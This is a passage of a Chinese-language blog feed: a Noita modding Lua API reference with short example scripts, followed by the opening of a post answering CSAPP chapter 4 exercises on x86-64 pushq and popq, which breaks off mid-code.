operator">=</span> <span class="token function">BiomeMapGetVerticalPositionInsideBiome</span><span class="token punctuation">(</span> x<span class="token punctuation">,</span> y <span class="token punctuation">)</span>spawn_percent <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token number">2.5</span> <span class="token operator">*</span> spawn_percent <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0.35</span><span class="token keyword">if</span><span class="token punctuation">(</span> r <span class="token operator">></span> spawn_percent <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token keyword">return</span> <span class="token keyword">end</span><span class="token function">spawn</span><span class="token punctuation">(</span>g_small_enemies<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="BiomeMapGetName"><a href="#BiomeMapGetName" class="headerlink" title="BiomeMapGetName"></a><code>BiomeMapGetName</code></h3><blockquote><p>BiomeMapGetName( x:number = camera_x, y:number = camera_y ) -&gt; name</p></blockquote><p>获取群系名字，输入世界坐标系下的坐标（像素），默认为镜头位置，返回名字。参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> pos_x<span class="token punctuation">,</span> pos_y <span class="token operator">=</span> <span class="token function">EntityGetTransform</span><span class="token punctuation">(</span> entity_id <span class="token punctuation">)</span><span class="token keyword">local</span> biome <span class="token operator">=</span> <span class="token function">BiomeMapGetName</span><span class="token punctuation">(</span> pos_x<span class="token punctuation">,</span> pos_y <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="CellFactory……（像素）"><a href="#CellFactory……（像素）" class="headerlink" title="CellFactory……（像素）"></a>CellFactory……（像素）</h2><h3 id="CellFactory-GetName"><a href="#CellFactory-GetName" class="headerlink" title="CellFactory_GetName"></a><code>CellFactory_GetName</code></h3><blockquote><p>CellFactory_GetName( material_id:int ) -&gt; string [Converts a numeric material id to the material’s strings id.]</p></blockquote><p>输入材料id，返回材料名（字符串）</p><h3 id="CellFactory-GetType"><a href="#CellFactory-GetType" class="headerlink" title="CellFactory_GetType"></a><code>CellFactory_GetType</code></h3><blockquote><p>CellFactory_GetType( material_name:string ) -&gt; int [Returns the id of a material.]</p></blockquote><p>输入材料名，返回材料id</p><h3 id="CellFactory-GetUIName"><a href="#CellFactory-GetUIName" class="headerlink" title="CellFactory_GetUIName"></a><code>CellFactory_GetUIName</code></h3><blockquote><p>CellFactory_GetUIName( material_id:int ) -&gt; string [Returns the displayed name of a material, or an empty string if ‘material_id’ is not valid. Might return a text key.]</p></blockquote><p>输入材料id，返回展ui_name。在materials.xml可以看到name，ui_name为不同的字段</p><h3 id="CellFactory-GetAllLiquids"><a href="#CellFactory-GetAllLiquids" class="headerlink" title="CellFactory_GetAllLiquids"></a><code>CellFactory_GetAllLiquids</code></h3><blockquote><p>CellFactory_GetAllLiquids( include_statics:bool = true, include_particle_fx_materials:bool = false ) -&gt; {string}</p></blockquote><p>可以无参数，默认为包括静态液体和粒子液体，可改为false，返回一个字符串表</p><p>测试两个参数为true/false区别的代码参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> t1 <span class="token operator">=</span> <span class="token function">CellFactory_GetAllLiquids</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                     <span class="token comment">-- 默认：包含静态和粒子特效材质</span>    <span class="token keyword">local</span> t2 <span class="token operator">=</span> <span class="token function">CellFactory_GetAllLiquids</span><span class="token punctuation">(</span><span class="token keyword">false</span><span class="token punctuation">)</span>                <span class="token comment">-- 排除静态</span>    <span class="token keyword">local</span> t3 <span class="token operator">=</span> <span class="token function">CellFactory_GetAllLiquids</span><span class="token punctuation">(</span><span class="token keyword">false</span><span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">)</span>         <span class="token comment">-- 排除静态和粒子材质</span>    <span class="token comment">-- 转集合</span>    <span class="token keyword">local</span> <span class="token keyword">function</span> <span class="token function">list_to_set</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span>        <span class="token keyword">local</span> set <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> _<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token function">ipairs</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span> <span class="token keyword">do</span>            set<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">true</span>        <span class="token keyword">end</span>        <span class="token keyword">return</span> set    <span class="token keyword">end</span>    <span class="token keyword">local</span> set1 <span class="token operator">=</span> <span class="token function">list_to_set</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span>    <span class="token keyword">local</span> set2 <span class="token operator">=</span> <span class="token function">list_to_set</span><span class="token punctuation">(</span>t2<span class="token punctuation">)</span>    <span class="token keyword">local</span> set3 <span class="token operator">=</span> <span class="token function">list_to_set</span><span class="token punctuation">(</span>t3<span class="token punctuation">)</span>    <span class="token comment">-- 差集打印</span>    <span class="token keyword">local</span> <span class="token keyword">function</span> <span class="token function">print_diff</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> base_set<span class="token punctuation">,</span> compare_set<span class="token punctuation">)</span>        <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"=== "</span> <span class="token operator">..</span> name <span class="token operator">..</span> <span class="token string">" 中独有的材料 ==="</span><span class="token punctuation">)</span>        <span class="token keyword">local</span> count <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> mat <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span>base_set<span class="token punctuation">)</span> <span class="token keyword">do</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> compare_set<span class="token punctuation">[</span>mat<span class="token punctuation">]</span> <span class="token keyword">then</span>                <span class="token function">GamePrint</span><span class="token punctuation">(</span>mat<span class="token punctuation">)</span>                count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">end</span>        <span class="token keyword">end</span>        <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">then</span>            <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"（无）"</span><span class="token punctuation">)</span>        <span class="token keyword">end</span>    <span class="token keyword">end</span>    <span class="token comment">-- 打印数量</span>    <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"=== 总数 ==="</span><span class="token punctuation">)</span>    <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"t1 (默认): "</span> <span class="token operator">..</span> <span class="token function">tostring</span><span class="token punctuation">(</span><span class="token operator">#</span>t1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"t2 (无静态): "</span> <span class="token operator">..</span> <span class="token function">tostring</span><span class="token punctuation">(</span><span class="token operator">#</span>t2<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"t3 (无静态无特效): "</span> <span class="token operator">..</span> <span class="token function">tostring</span><span class="token punctuation">(</span><span class="token operator">#</span>t3<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">-- 差集对比</span>    <span class="token function">print_diff</span><span class="token punctuation">(</span><span class="token string">"t1"</span><span class="token punctuation">,</span> set1<span class="token punctuation">,</span> set2<span class="token punctuation">)</span>   <span class="token comment">-- t1 - t2 = 静态液体</span>    <span class="token function">print_diff</span><span class="token punctuation">(</span><span class="token string">"t2"</span><span class="token punctuation">,</span> set2<span class="token punctuation">,</span> set3<span class="token punctuation">)</span>   <span class="token comment">-- t2 - t3 = 特效粒子液体</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="CellFactory-GetAllSands"><a href="#CellFactory-GetAllSands" class="headerlink" title="CellFactory_GetAllSands"></a><code>CellFactory_GetAllSands</code></h3><p>同上</p><h3 id="CellFactory-GetAllGases"><a href="#CellFactory-GetAllGases" class="headerlink" title="CellFactory_GetAllGases"></a><code>CellFactory_GetAllGases</code></h3><p>同上</p><h3 id="CellFactory-GetAllFires"><a href="#CellFactory-GetAllFires" class="headerlink" title="CellFactory_GetAllFires"></a><code>CellFactory_GetAllFires</code></h3><p>同上</p><h3 id="CellFactory-GetAllSolids"><a href="#CellFactory-GetAllSolids" class="headerlink" title="CellFactory_GetAllSolids"></a><code>CellFactory_GetAllSolids</code></h3><p>同上</p><h3 id="CellFactory-GetTags"><a href="#CellFactory-GetTags" class="headerlink" title="CellFactory_GetTags"></a><code>CellFactory_GetTags</code></h3><blockquote><p>CellFactory_GetTags( material_id:int ) -&gt; {string}</p></blockquote><p>获取某种材料的tags，输入材料id，返回字符串表</p><h3 id="CellFactory-HasTag"><a href="#CellFactory-HasTag" class="headerlink" title="CellFactory_HasTag"></a><code>CellFactory_HasTag</code></h3><blockquote><p>CellFactory_HasTag( material_id:int, tag:string ) -&gt; {bool}</p></blockquote><p>检查某种材料是否具有某个标签，输入材料id，标签（带中括号），返回一个bool值（不要被上面的{bool}骗了）</p><h2 id="射线"><a href="#射线" class="headerlink" title="射线"></a>射线</h2><h3 id="Raytrace"><a href="#Raytrace" class="headerlink" title="Raytrace"></a><code>Raytrace</code></h3><blockquote><p>Raytrace( x1:number, y1:number, x2:number, y2:number ) -&gt; did_hit:bool,hit_x:number,hit_y:number [Does a raytrace that stops on any cell it hits.]</p></blockquote><p>输入两对坐标，返回一个bool值是否碰撞，以及碰撞位置的坐标</p><p>开销在 200次/ms 左右，也就是每帧1000不会导致卡顿，局部性良好的话可以更高</p><h3 id="RaytraceSurfaces"><a href="#RaytraceSurfaces" class="headerlink" title="RaytraceSurfaces"></a><code>RaytraceSurfaces</code></h3><blockquote><p>RaytraceSurfaces( x1:number, y1:number, x2:number, y2:number ) -&gt; did_hit:bool,hit_x:number,hit_y:number [Does a raytrace that stops on any cell that is not fluid, gas (yes, technically gas is a fluid), or fire.]</p></blockquote><p>输入输出同上，但是碰撞不包括液体、气体和火焰，开销和Raytrace基本一致</p><h3 id="RaytraceSurfacesAndLiquiform"><a href="#RaytraceSurfacesAndLiquiform" class="headerlink" title="RaytraceSurfacesAndLiquiform"></a><code>RaytraceSurfacesAndLiquiform</code></h3><blockquote><p>RaytraceSurfacesAndLiquiform( x1:number, y1:number, x2:number, y2:number ) -&gt; did_hit:bool,hit_x:number,hit_y:number [Does a raytrace that stops on any cell that is not gas or fire.]</p></blockquote><p>检测碰撞任何除气体和火焰之外的像素，几乎没有局部性时开销和Raytrace基本一致，局部性良好的话开销比Raytrace高</p><h3 id="RaytracePlatforms"><a href="#RaytracePlatforms" class="headerlink" title="RaytracePlatforms"></a><code>RaytracePlatforms</code></h3><blockquote><p>RaytracePlatforms( x1:number, y1:number, x2:number, y2:number ) -&gt; did_hit:bool,hit_x:number,hit_y:number [Does a raytrace that stops on any cell a character can stand on.]</p></blockquote><p>碰撞标准是像素可以站上去，开销略高Raytrace一点点</p><h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a><code>Random</code></h3><blockquote><p>Random( a:int = optional, b:int = optional ) -&gt; number|int. [This is kinda messy. If given 0 arguments, returns number between 0.0 and 1.0. If given 1 arguments, returns int between 0 and ‘a’. If given 2 arguments returns int between ‘a’ and ‘b’.]</p></blockquote><p>生成随机整数，没有参数返回值范围是0~1，一个参数是0~a，两个参数是a~b</p><h3 id="Randomf"><a href="#Randomf" class="headerlink" title="Randomf"></a><code>Randomf</code></h3><blockquote><p>Randomf( min:number = optional, max:number = optional ) -&gt; number [This is kinda messy. If given 0 arguments, returns number between 0.0 and 1.0. If given 1 arguments, returns number between 0.0 and ‘a’. If given 2 arguments returns number between ‘a’ and ‘b’.]</p></blockquote><p>生成随机数，范围同Random</p><h3 id="RandomDistribution"><a href="#RandomDistribution" class="headerlink" title="RandomDistribution"></a><code>RandomDistribution</code></h3><blockquote><p>RandomDistribution( min:int, max:int, mean:int, sharpness:number = 1, baseline:number = 0.005 ) -&gt; int</p></blockquote><p>疑似是正态分布，输出最小值，最大值，均值，尖锐度，基线。返回一个整数</p><h3 id="RandomDistributionf"><a href="#RandomDistributionf" class="headerlink" title="RandomDistributionf"></a><code>RandomDistributionf</code></h3><blockquote><p>RandomDistributionf( min:number, max:number, mean:number, sharpness:number = 1, baseline:number = 0.005 ) -&gt; number</p></blockquote><p>同上，返回一个浮点数</p><h3 id="ProceduralRandom"><a href="#ProceduralRandom" class="headerlink" title="ProceduralRandom"></a><code>ProceduralRandom</code></h3><blockquote><p>ProceduralRandom( x:number, y:number, a:int|number = optional, b:int|number = optional ) -&gt; int|number [This is kinda messy. If given 2 arguments, returns number between 0.0 and 1.0. If given 3 arguments, returns int between 0 and ‘a’. If given 4 arguments returns number between ‘a’ and ‘b’.]</p></blockquote><p>x，y是随机的种子。输入两个参数，返回0.0到1.0之间的浮点数，三个参数，返回0到a之间的整数，四个参数，返回a到b之间的一个随机浮点数</p><h3 id="ProceduralRandomf"><a href="#ProceduralRandomf" class="headerlink" title="ProceduralRandomf"></a><code>ProceduralRandomf</code></h3><blockquote><p>ProceduralRandomf( x:number, y:number, a:number = optional, b:number = optional ) -&gt; number [This is kinda messy. If given 2 arguments, returns number between 0.0 and 1.0. If given 3 arguments, returns a number between 0 and ‘a’. If given 4 arguments returns a number between ‘a’ and ‘b’.]</p></blockquote><p>同上，但是只返回浮点数</p><h3 id="ProceduralRandomi"><a href="#ProceduralRandomi" class="headerlink" title="ProceduralRandomi"></a><code>ProceduralRandomi</code></h3><blockquote><p>ProceduralRandomi(  x:number, y:number, a:int = optional, b:int = optional ) -&gt; number [This is kinda messy. If given 2 arguments, returns 0 or 1. If given 3 arguments, returns an int between 0 and ‘a’. If given 4 arguments returns an int between ‘a’ and ‘b’.]</p></blockquote><p>x，y作为种子，两个参数返回0或1，三个参数返回0到a范围内的随机整数，四个参数返回a到b的整数</p><h2 id="战争之雾"><a href="#战争之雾" class="headerlink" title="战争之雾"></a>战争之雾</h2><p>就是全知之眼去掉的东西</p><h3 id="GameGetFogOfWar"><a href="#GameGetFogOfWar" class="headerlink" title="GameGetFogOfWar"></a><code>GameGetFogOfWar</code></h3><blockquote><p>GameGetFogOfWar( pos_x:number, pos_y:number ) -&gt; fog_of_war:int [Returns an integer between 0 and 255. Larger value means more coverage. Returns -1 if query is outside the bounds of the fog of war grid. For performance reasons consider using the components that manipulate fog of war.]</p></blockquote><p>获取战争之雾，输入坐标，返回一个0-255的整数，数值越大表示覆盖范围越大，-1表示表示超出战争之雾格子边界。</p><h3 id="GameGetFogOfWarBilinear"><a href="#GameGetFogOfWarBilinear" class="headerlink" title="GameGetFogOfWarBilinear"></a><code>GameGetFogOfWarBilinear</code></h3><blockquote><p>GameGetFogOfWarBilinear( pos_x:number, pos_y:number ) -&gt; fog_of_war:int [Returns an integer between 0 and 255. Larger value means more coverage. Returns -1 if query is outside the bounds of the fog of war grid. The value is bilinearly filtered using four samples around ‘pos’. For performance reasons consider using the components that manipulate fog of war.]</p></blockquote><p>通过对周围四个样本点进行插值，提供更平滑的迷雾覆盖结果。用法同上</p><h3 id="GameSetFogOfWar"><a href="#GameSetFogOfWar" class="headerlink" title="GameSetFogOfWar"></a><code>GameSetFogOfWar</code></h3><blockquote><p>GameSetFogOfWar( pos_x:number, pos_y:number, fog_of_war:int ) -&gt; pos_valid:bool [‘fog_of_war’ should be between 0 and 255 (but will be clamped to the correct range with a int32-&gt;uint8 cast). Larger value means more coverage. Returns a boolean indicating whether or not the position was inside the bounds of the fog of war grid. For performance reasons consider using the components that manipulate fog of war.]</p></blockquote><p>设置战争之雾的值，输入坐标，值，0-255之间越大范围越大，超出255会被强制转化。返回一个bool值表示是否输入坐标在战争之雾格子范围内</p><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>noita有一系列api辅助管理全局变量</p><h3 id="GameAddFlagRun"><a href="#GameAddFlagRun" class="headerlink" title="GameAddFlagRun"></a><code>GameAddFlagRun</code></h3><blockquote><p>GameAddFlagRun( flag:string )</p></blockquote><p>flag可以看做一个bool型全局变量，add即初始化/由false改为true</p><h3 id="GameRemoveFlagRun"><a href="#GameRemoveFlagRun" class="headerlink" title="GameRemoveFlagRun"></a><code>GameRemoveFlagRun</code></h3><blockquote><p>GameRemoveFlagRun( flag:string )</p></blockquote><p>移走flag，可以近似认为把该全局变量设置为false</p><h3 id="GameHasFlagRun"><a href="#GameHasFlagRun" class="headerlink" title="GameHasFlagRun"></a><code>GameHasFlagRun</code></h3><blockquote><p>GameHasFlagRun( flag:string ) -&gt; bool</p></blockquote><p>获取该“全局变量”的值</p><h3 id="GlobalsSetValue"><a href="#GlobalsSetValue" class="headerlink" title="GlobalsSetValue"></a><code>GlobalsSetValue</code></h3><blockquote><p>GlobalsSetValue( key:string, value:string )</p></blockquote><p>设置一个全局变量，输入变量名，值（字符串）</p><h3 id="GlobalsGetValue"><a href="#GlobalsGetValue" class="headerlink" title="GlobalsGetValue"></a><code>GlobalsGetValue</code></h3><blockquote><p>GlobalsGetValue( key:string, default_value:string = “” )</p></blockquote><p>获取一个全局变量的值，输入变量名，默认值（变量不存在时的返回值，字符串），返回字符串，<strong>获取数字需要加上tonumber</strong></p><h3 id="AddFlagPersistent"><a href="#AddFlagPersistent" class="headerlink" title="AddFlagPersistent"></a><code>AddFlagPersistent</code></h3><blockquote><p>AddFlagPersistent( key:string ) -&gt; bool_is_new</p></blockquote><p>输入字符串，增加一个永久flag，跨存档持久化的，游戏内用于各种进展</p><h3 id="HasFlagPersistent"><a href="#HasFlagPersistent" class="headerlink" title="HasFlagPersistent"></a><code>HasFlagPersistent</code></h3><blockquote><p>HasFlagPersistent( key:string ) -&gt; bool</p></blockquote><p>检查是否有某个永久flag</p><h3 id="RemoveFlagPersistent"><a href="#RemoveFlagPersistent" class="headerlink" title="RemoveFlagPersistent"></a><code>RemoveFlagPersistent</code></h3><blockquote><p>RemoveFlagPersistent( key:string )</p></blockquote><p>移除某个永久flag</p><h2 id="Camera"><a href="#Camera" class="headerlink" title="Camera"></a>Camera</h2><h3 id="GameGetCameraPos"><a href="#GameGetCameraPos" class="headerlink" title="GameGetCameraPos"></a><code>GameGetCameraPos</code></h3><blockquote><p>GameGetCameraPos() -&gt; x:number,y:number</p></blockquote><p>获取当前相机位置，返回坐标</p><h3 id="GameSetCameraPos"><a href="#GameSetCameraPos" class="headerlink" title="GameSetCameraPos"></a><code>GameSetCameraPos</code></h3><blockquote><p>GameSetCameraPos( x:number, y:number )</p></blockquote><p>设置镜头位置</p><h3 id="GameSetCameraFree"><a href="#GameSetCameraFree" class="headerlink" title="GameSetCameraFree"></a><code>GameSetCameraFree</code></h3><blockquote><p>GameSetCameraFree( is_free:bool )</p></blockquote><p>设置镜头自由与否（是否绑在米娜身上），自由后可以控制移动</p><h3 id="GameGetCameraBounds"><a href="#GameGetCameraBounds" class="headerlink" title="GameGetCameraBounds"></a><code>GameGetCameraBounds</code></h3><blockquote><p>GameGetCameraBounds() -&gt; x:number,y:number,w:number,h:number [Returns the camera rectangle. This may not be 100% pixel perfect with regards to what you see on the screen. ‘x’,’y’ = top left corner of the rectangle.]</p></blockquote><p>获取镜头边界，一个长方形，返回左上角坐标，宽、高</p><h2 id="混乱变形"><a href="#混乱变形" class="headerlink" title="混乱变形"></a>混乱变形</h2><p>游戏有一个混乱变形表，里面存着混乱变形效果生效的范围</p><h3 id="PolymorphTableAddEntity"><a href="#PolymorphTableAddEntity" class="headerlink" title="PolymorphTableAddEntity"></a><code>PolymorphTableAddEntity</code></h3><blockquote><p>PolymorphTableAddEntity( entity_xml:string, is_rare:bool = false, add_only_one_copy:bool = true ) [Adds the entity to the polymorph random table]</p></blockquote><p>往表里增加实体，参数为：xml路径名，两个bool变量，意义不明</p><h3 id="PolymorphTableRemoveEntity"><a href="#PolymorphTableRemoveEntity" class="headerlink" title="PolymorphTableRemoveEntity"></a><code>PolymorphTableRemoveEntity</code></h3><blockquote><p>PolymorphTableRemoveEntity( entity_xml:string, from_common_table:bool = true, from_rare_table:bool = true ) [Removes the entity from the polymorph random table]</p></blockquote><p>从表里移除实体，同上</p><h3 id="PolymorphTableGet"><a href="#PolymorphTableGet" class="headerlink" title="PolymorphTableGet"></a><code>PolymorphTableGet</code></h3><blockquote><p>PolymorphTableGet( bool rare_table = false ) -&gt; {string} [Returns a list of all the entities in the polymorph random table]</p></blockquote><p>获取表的信息，全部实体</p><h3 id="PolymorphTableSet"><a href="#PolymorphTableSet" class="headerlink" title="PolymorphTableSet"></a><code>PolymorphTableSet</code></h3><blockquote><p>PolymorphTableSet( {table_of_xml_entities}, bool rare_table = false ) [Set a list of all entities sas the polymorph random table]</p></blockquote><p>重新设置表，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">set_worm_only_polymorph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">local</span> worm_entities <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"data/entities/animals/worm.xml"</span><span class="token punctuation">,</span>           <span class="token comment">-- 普通蠕虫</span><span class="token string">"data/entities/animals/worm_big.xml"</span><span class="token punctuation">,</span>       <span class="token comment">-- 大蠕虫</span><span class="token string">"data/entities/animals/worm_tiny.xml"</span><span class="token punctuation">,</span>      <span class="token comment">-- 小蠕虫</span><span class="token string">"data/entities/animals/worm_end.xml"</span><span class="token punctuation">,</span>       <span class="token comment">-- 地狱蠕虫</span><span class="token string">"data/entities/animals/worm_skull.xml"</span>      <span class="token comment">-- 幽灵蠕虫</span><span class="token punctuation">&#125;</span><span class="token function">PolymorphTableSet</span><span class="token punctuation">(</span>worm_entities<span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">)</span><span class="token function">PolymorphTableSet</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">)</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="Herd（阵营）"><a href="#Herd（阵营）" class="headerlink" title="Herd（阵营）"></a>Herd（阵营）</h2><p>noita的生物都有一个阵营字段，详细可以参考<a href="https://noita.wiki.gg/zh/wiki/%E6%95%8C%E4%BA%BA%E9%98%B5%E8%90%A5">这里</a></p><h3 id="StringToHerdId"><a href="#StringToHerdId" class="headerlink" title="StringToHerdId"></a><code>StringToHerdId</code></h3><blockquote><p>StringToHerdId( herd_name:string  ) -&gt; int</p></blockquote><p>输入阵营字符串，返回阵营id</p><h3 id="HerdIdToString"><a href="#HerdIdToString" class="headerlink" title="HerdIdToString"></a><code>HerdIdToString</code></h3><blockquote><p>HerdIdToString( herd_id:int ) -&gt; string</p></blockquote><p>上一个的逆过程，输入id返回字符串</p><h3 id="GetHerdRelation"><a href="#GetHerdRelation" class="headerlink" title="GetHerdRelation"></a><code>GetHerdRelation</code></h3><blockquote><p>GetHerdRelation( herd_id_a:int, herd_id_b:int ) -&gt; number</p></blockquote><p>获取阵营关系，输入两个阵营id，返回一个数，越高越友善（可以直接去wiki查表的）</p><h3 id="EntityGetHerdRelation"><a href="#EntityGetHerdRelation" class="headerlink" title="EntityGetHerdRelation"></a><code>EntityGetHerdRelation</code></h3><blockquote><p>EntityGetHerdRelation( entity_a:int, entity_b:int ) -&gt; number</p></blockquote><p>输入两个实体id，返回友善程度（不被攻击的概率）</p><h3 id="EntityGetHerdRelationSafe"><a href="#EntityGetHerdRelationSafe" class="headerlink" title="EntityGetHerdRelationSafe"></a><code>EntityGetHerdRelationSafe</code></h3><blockquote><p>EntityGetHerdRelationSafe( entity_a:int, entity_b:int ) -&gt; number [does not spam errors, but returns 0 if anything fails]</p></blockquote><p>上一个函数的安全版本，指出错了返回0，其余一致</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="GetParallelWorldPosition"><a href="#GetParallelWorldPosition" class="headerlink" title="GetParallelWorldPosition"></a><code>GetParallelWorldPosition</code></h3><blockquote><p>GetParallelWorldPosition( world_pos_x:number, world_pos_y:number ) -&gt; x, y [x = 0 normal world, -1 is first west world, +1 is first east world, if y &lt; 0 it is sky, if y &gt; 0 it is hell ]</p></blockquote><p>输入坐标，返回x,y。x表示平行世界值，0为主世界，-1为第一个西方向世界，1为第一个东方向世界，y<0表明在天堂，y>0表明在地狱</p><h3 id="IsPlayer"><a href="#IsPlayer" class="headerlink" title="IsPlayer"></a><code>IsPlayer</code></h3><blockquote><p>IsPlayer( entity_id:int ) -&gt; bool</p></blockquote><p>输入实体id，返回是否是玩家</p><h3 id="IsInvisible"><a href="#IsInvisible" class="headerlink" title="IsInvisible"></a><code>IsInvisible</code></h3><blockquote><p>IsInvisible( entity_id:int ) -&gt; bool</p></blockquote><p>输入实体id，返回是否不可见</p><h3 id="GameIsDailyRun"><a href="#GameIsDailyRun" class="headerlink" title="GameIsDailyRun"></a><code>GameIsDailyRun</code></h3><blockquote><p>GameIsDailyRun() -&gt; bool</p></blockquote><p>是否是每日挑战</p><h3 id="GameIsDailyRunOrDailyPracticeRun"><a href="#GameIsDailyRunOrDailyPracticeRun" class="headerlink" title="GameIsDailyRunOrDailyPracticeRun"></a><code>GameIsDailyRunOrDailyPracticeRun</code></h3><blockquote><p>GameIsDailyRunOrDailyPracticeRun() -&gt; bool</p></blockquote><p>是否是每日挑战或每日练习</p><h3 id="GameIsModeFullyDeterministic"><a href="#GameIsModeFullyDeterministic" class="headerlink" title="GameIsModeFullyDeterministic"></a><code>GameIsModeFullyDeterministic</code></h3><blockquote><p>GameIsModeFullyDeterministic() -&gt; bool</p></blockquote><p>游戏是否完全确定（有待进一步测试用法）</p><h3 id="dofile"><a href="#dofile" class="headerlink" title="dofile"></a><code>dofile</code></h3><blockquote><p>dofile( filename:string ) -&gt; (nil|script_return_type)|(nil,error_string) [Returns the script’s return value, if any. Returns nil,error_string if the script had errors.]</p></blockquote><p>输入一个文件，返回脚本的返回值，或nil</p><h3 id="dofile-once"><a href="#dofile-once" class="headerlink" title="dofile_once"></a><code>dofile_once</code></h3><blockquote><p>dofile_once( filename:string ) -&gt; (nil|script_return_type)|(nil,error_string) [Runs the script only once per lua context, returns the script’s return value, if any. Returns nil,error_string if the script had errors. For performance reasons it is recommended scripts use dofile_once(), unless the standard dofile behaviour is required.]</p></blockquote><p>同上，保证不重复执行脚本，用于替代dofile</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;span style = &quot;font-size: 30px; font-weight: 900&quot;&gt;一个 noita API使用参考文档 &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;noita的api只提供了参数和返回值，大多都没写具体效果，&lt;a</summary>
        
      
    
    
    
    <category term="noita" scheme="https://aucept.in/categories/noita/"/>
    
    
    <category term="lua" scheme="https://aucept.in/tags/lua/"/>
    
    <category term="noita" scheme="https://aucept.in/tags/noita/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP-第四章</title>
    <link href="https://aucept.in/2025/07/28/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/"/>
    <id>https://aucept.in/2025/07/28/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/</id>
    <published>2025-07-28T04:50:13.000Z</published>
    <updated>2025-07-29T09:35:12.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="4-45"><a href="#4-45" class="headerlink" title="*4.45"></a><code>*4.45</code></h2><blockquote><p>在3.4.2节中，x86-64 pushq 指令被描述成要减少栈指针，然后将寄存器存储在栈指针的位置。因此，如果我们有一条指令形如对于某个寄存器 REG, pushq REG, 它等价千下面的代<br>码序列：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">subq $8,%rsp  Decrement stack pointermovq REG, (%rsp)  Store REG on stack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>A. 借助于练习题 4.7中所做的分析，这段代码序列正确地描述了指令 pushq %rsp 的行为吗？请解释。</p><p>B. 你该如何改写这段代码序列，使得它能够像对 REG 是其他寄存器时一样，正确地描述 REG 是%rsp 的情况？</p></blockquote><p>正常来说入栈是栈指针下移，把值放到栈上，但是pushq %rsp时，如果真的有这行代码，存的值是下移前还是后就产生了歧义。4.7告诉我们存的是没有减小的栈指针，所以题目所给的汇编代码是不正确的</p><p>修改的话：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">movq REG, (%rsp-8)subq $8,%rsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><hr><h2 id="4-46"><a href="#4-46" class="headerlink" title="*4.46"></a><code>*4.46</code></h2><blockquote><p>3.4.2节中， x86-64 popq 指令被描述为将来自栈顶的结果复制到目的寄存器，然后将栈指针减少。因此，如果我们有一条指令形如 popq REG, 它等价于下面的代码序列：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">&gt;movq (%rsp), REG    Read REG from stack&gt;addq $8,%rsp        Increment stack pointer<span aria-hidden="true" 